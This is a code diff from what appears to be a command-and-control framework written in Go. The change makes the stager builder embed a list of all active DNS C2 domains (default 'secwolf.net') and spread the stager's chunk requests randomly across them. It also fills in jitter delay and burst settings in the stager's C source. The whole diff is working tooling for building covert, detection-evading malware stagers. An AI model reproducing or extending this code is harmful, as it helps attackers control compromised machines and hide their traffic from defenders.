@@ -271,6 +271,42 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		fmt.Printf("[Builder] Building stager (will use client binary: %s when deployed)\n", req.ClientBinaryID)
 	}
 
+	// AUTO-SELECT DNS DOMAIN: Use ALL active DNS servers for load balancing
+	// Stager will randomly pick domains for each chunk request
+	if req.Domain == "" {
+		dnsServers, err := api.db.GetDNSServers()
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
+			return
+		}
+
+		if len(dnsServers) == 0 {
+			api.sendError(w, http.StatusBadRequest, "no DNS servers registered - build a DNS server first")
+			return
+		}
+
+		// Collect ALL active DNS server domains
+		var activeDomains []string
+		for _, server := range dnsServers {
+			if status, ok := server["status"].(string); ok && status == "active" {
+				if domain, ok := server["domain"].(string); ok {
+					activeDomains = append(activeDomains, domain)
+				}
+			}
+		}
+
+		if len(activeDomains) == 0 {
+			api.sendError(w, http.StatusBadRequest, "no active DNS servers found - ensure DNS servers are running")
+			return
+		}
+
+		// Join all domains with comma (stager will parse and randomly select)
+		req.Domain = strings.Join(activeDomains, ",")
+		fmt.Printf("[Builder] 🚀 Building stager with Shadow Mesh client-side load balancing:\n")
+		fmt.Printf("  └─ Embedded domains: %s\n", req.Domain)
+		fmt.Printf("  └─ Stager will randomly distribute requests across %d DNS servers\n", len(activeDomains))
+	}
+
 	// Build the stager
 	binaryPath, err := buildStager(req, api.config.SourceDir)
 	if err != nil {
@@ -567,7 +603,8 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 
 	codeStr := string(stagerCode)
 	// Note: stager.c has extra spaces and comments - must match exactly
-	codeStr = strings.Replace(codeStr, `#define C2_DOMAIN "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAIN "%s"`, req.Domain), 1)
+	// Replace C2_DOMAINS with comma-separated list of all active DNS domains
+	codeStr = strings.Replace(codeStr, `#define C2_DOMAINS "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAINS "%s"`, req.Domain), 1)
 	codeStr = strings.Replace(codeStr, `#define MIN_CHUNK_DELAY_MS 60000`, fmt.Sprintf(`#define MIN_CHUNK_DELAY_MS %d`, req.JitterMinMs), 1)
 	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
 	codeStr = strings.Replace(codeStr, `#define CHUNKS_PER_BURST 5`, fmt.Sprintf(`#define CHUNKS_PER_BURST %d`, req.ChunksPerBurst), 1)
